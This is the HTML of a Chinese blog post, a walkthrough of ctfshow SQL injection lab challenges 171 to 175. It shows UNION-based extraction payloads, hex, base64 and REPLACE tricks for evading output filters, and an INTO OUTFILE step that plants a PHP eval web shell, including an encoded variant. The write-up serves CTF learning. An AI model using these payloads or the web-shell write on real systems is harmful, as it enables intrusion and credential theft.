@@ -1,0 +1,806 @@
+
+
+<!DOCTYPE html>
+<html lang="zn-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.jpg">
+  <link rel="icon" href="/img/1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="171 题目 使用sqlmap是没有灵魂的 查询语句： 12&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#x27;flag&#x27; and id &#x3D; &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web入门-sql注入">
+<meta property="og:url" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/index.html">
+<meta property="og:site_name" content="Bubble&#39;s Blog">
+<meta property="og:description" content="171 题目 使用sqlmap是没有灵魂的 查询语句： 12&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#x27;flag&#x27; and id &#x3D; &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;">
+<meta property="og:locale" content="zn_CN">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.3.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.4.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/2.1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/2.2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/3.2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/3.1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.3.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.4.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.5.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.12.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.13.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.14.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.6.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.7.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.8.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.9.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.10.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.11.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.15.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.16.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/6.1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/6.2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.17.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/6.3.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/8.1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/10.1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/10.2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/11.1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.3.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/183.4.jpg">
+<meta property="article:published_time" content="2024-02-21T15:06:08.957Z">
+<meta property="article:modified_time" content="2024-02-21T15:16:01.384Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ybubble.github.io/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.1.jpg">
+  
+  
+  
+  <title>web入门-sql注入 - Bubble&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ybubble.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Bubble</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Category</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="web入门-sql注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-21 23:06" pubdate>
+          February 21, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">web入门-sql注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>171</h1>
+<h2 id="题目">题目</h2>
+<p><code>使用sqlmap是没有灵魂的</code></p>
+<p>查询语句：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure>
+<h2 id="解法1">解法1</h2>
+<p>payload：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">-<span class="hljs-number">1</span>&#x27; or id = &#x27;<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.1.jpg" srcset="/img/loading.gif" lazyload class="">
+<h2 id="解法2">解法2</h2>
+<ol>
+<li>
+<p>获取数据库名</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() --+ <br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.2.jpg" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>获取表名</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">-1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;ctfshow_user&#x27;</span> --+ <br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.3.jpg" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>得到flag</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">-1</span>&#x27; union select <span class="hljs-built_in">id</span>,username,password <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-comment">--+ </span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/1.4.jpg" srcset="/img/loading.gif" lazyload class="">
+</li>
+</ol>
+<h1>172</h1>
+<h2 id="题目-2">题目</h2>
+<p>查询语句</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user2 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure>
+<p>返回逻辑</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//检查结果是否有flag</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-symbol">$row</span>-&gt;username!==<span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>      <span class="hljs-symbol">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>返回结果过滤了含”flag“的记录</p>
+<h2 id="解法1-2">解法1</h2>
+<p>payload</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27; union <span class="hljs-keyword">select</span> id,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user2 <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;flag</span><br></code></pre></td></tr></table></figure>
+<p>不返回用户名”flag“</p>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/2.1.jpg" srcset="/img/loading.gif" lazyload class="">
+<h2 id="解法2-2">解法2</h2>
+<p>使用base64或者hex编码</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27; union <span class="hljs-keyword">select</span> to_base64(username),to_base64(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> ctfshow_user2 --+<br></code></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27; union <span class="hljs-keyword">select</span> hex(username),hex(<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> ctfshow_user2 --+<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/2.2.jpg" srcset="/img/loading.gif" lazyload class="">
+<h1>173</h1>
+<p>与172类似</p>
+<p>查询语句：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure>
+<p>返回逻辑</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//检查结果是否有flag</span><br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, json_encode(<span class="hljs-symbol">$ret</span>)))&#123;<br>      <span class="hljs-symbol">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;<br>      <br></code></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">-1</span>&#x27; union select <span class="hljs-built_in">id</span>,hex(username),hex(password) <span class="hljs-keyword">from</span> ctfshow_user3 <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/3.2.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>在线hex解码</p>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/3.1.jpg" srcset="/img/loading.gif" lazyload class="">
+<h1>174</h1>
+<p>replace用法：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-string">&quot;要替换的字符串&quot;</span>,<span class="hljs-string">&quot;想要替换的字符&quot;</span>,<span class="hljs-string">&quot;替换成的字符&quot;</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)</span></span>---&gt;<span class="hljs-number">1</span>bc<br></code></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">replace(<span class="hljs-keyword">password</span>,&quot;1&quot;,&quot;!&quot;)<br>replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(<span class="hljs-keyword">password</span>,&quot;0&quot;,&quot;)&quot;),&quot;9&quot;,&quot;(&quot;),&quot;8&quot;,&quot;*&quot;),&quot;7&quot;,&quot;&amp;&quot;),&quot;6&quot;,&quot;^&quot;),&quot;5&quot;,&quot;%&quot;),&quot;4&quot;,&quot;$&quot;),&quot;3&quot;,&quot;#&quot;),&quot;2&quot;,&quot;@&quot;),&quot;1&quot;,&quot;!&quot;)<br></code></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-built_in">replace</span>(<span class="hljs-keyword">password</span>,<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;)&quot;</span>),<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;(&quot;</span>),<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>),<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;&amp;&quot;</span>),<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;^&quot;</span>),<span class="hljs-string">&quot;5&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>),<span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;$&quot;</span>),<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;#&quot;</span>),<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;@&quot;</span>),<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>) <span class="hljs-keyword">from</span> ctfshow_user4 <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;flag&#x27;</span> --+<br></code></pre></td></tr></table></figure>
+<h1>175</h1>
+<p>查询语句：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//拼接sql语句查找指定ID用户<br>$sql = &quot;<span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user5 <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br></code></pre></td></tr></table></figure>
+<p>返回逻辑：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">//检查结果是否有flag</span><br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[\x00-\x7f]/i&#x27;</span>, json_encode(<span class="hljs-symbol">$ret</span>)))&#123;<br>      <span class="hljs-symbol">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;查询成功&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>解题过程：</p>
+<ol>
+<li>通过写入文件的方式</li>
+</ol>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">99&#x27; union select 1,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; into outfile &#x27;/var/www/html/1.php&#x27;</span><br></code></pre></td></tr></table></figure>
+<ol start="2">
+<li>
+<p>将命令进行base64编码</p>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.1.jpg" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>再进行url编码</p>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.2.jpg" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>payload</p>
+</li>
+</ol>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-number">99</span>&#x27; union select <span class="hljs-number">1</span>,from_base64(&quot;<span class="hljs-variable">%50%</span><span class="hljs-number">44</span><span class="hljs-variable">%39%</span><span class="hljs-number">77</span><span class="hljs-variable">%61%</span><span class="hljs-number">48</span><span class="hljs-variable">%41%</span><span class="hljs-number">67</span><span class="hljs-variable">%5a%</span><span class="hljs-number">58</span><span class="hljs-variable">%5a%</span><span class="hljs-number">68</span><span class="hljs-variable">%62%</span><span class="hljs-number">43</span><span class="hljs-variable">%67%</span><span class="hljs-number">6</span>b<span class="hljs-variable">%58%</span><span class="hljs-number">31</span><span class="hljs-variable">%42%</span><span class="hljs-number">50</span><span class="hljs-variable">%55%</span><span class="hljs-number">31</span><span class="hljs-variable">%52%</span><span class="hljs-number">62</span><span class="hljs-variable">%4d%</span><span class="hljs-number">56</span><span class="hljs-variable">%30%</span><span class="hljs-number">70</span><span class="hljs-variable">%4f%</span><span class="hljs-number">7</span>a<span class="hljs-variable">%38%</span><span class="hljs-number">2</span>b&quot;) into outfile &#x27;/var/www/html/<span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure>
+<p>（注意最后不闭合）</p>
+<ol start="5">
+<li>
+<p>抓包重放，发现payload完整，未被截断，响应无有用信息，无法判断是否成功写入文件</p>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.3.jpg" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>尝试：通过url访问，查看php文件是否写入server</p>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.4.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>已经成功写入文件</p>
+</li>
+<li>
+<p>利用hackercar尝试执行命令phpinfo()→成功</p>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.5.jpg" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>接着获取密码</p>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.12.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.13.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.14.jpg" srcset="/img/loading.gif" lazyload class="">
+</li>
+<li>
+<p>使用蚁剑获取数据库信息</p>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.6.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.7.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.8.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.9.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.10.jpg" srcset="/img/loading.gif" lazyload class="">
+</li>
+</ol>
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.11.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/21/ctfshow_web%E5%85%A5%E9%97%A8_sql/5.15.jpg" srcset="/img/loading.gif" lazyload class="">
